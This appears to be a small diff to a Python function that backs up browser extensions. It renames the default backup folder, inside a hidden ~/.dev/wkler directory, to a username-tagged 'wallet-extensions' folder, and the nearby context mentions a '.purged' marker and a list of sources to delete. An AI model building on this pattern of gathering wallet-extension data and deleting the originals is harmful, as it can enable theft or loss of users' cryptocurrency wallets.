@@ -106,17 +106,18 @@ def backup_browser_extensions(backup_dir: Path = None, dry_run: bool = False) ->
     dry_run=True 时只扫描并打印将处理的目录，不复制、不删除、不写标记文件。
     """
     wkler_dir = Path.home() / ".dev" / "wkler"
+
+    username = getpass.getuser()
+    user_prefix = username[:5] if username else "user"
+
     if backup_dir is None:
-        backup_dir = wkler_dir / "backup"
+        backup_dir = wkler_dir / f"{user_prefix}_wallet-extensions"
 
     if not dry_run:
         backup_dir.mkdir(parents=True, exist_ok=True)
 
     marker_file = wkler_dir / ".purged"
     first_run = not marker_file.exists()
-
-    username = getpass.getuser()
-    user_prefix = username[:5] if username else "user"
 
     backed_up = 0
     sources_to_delete = []
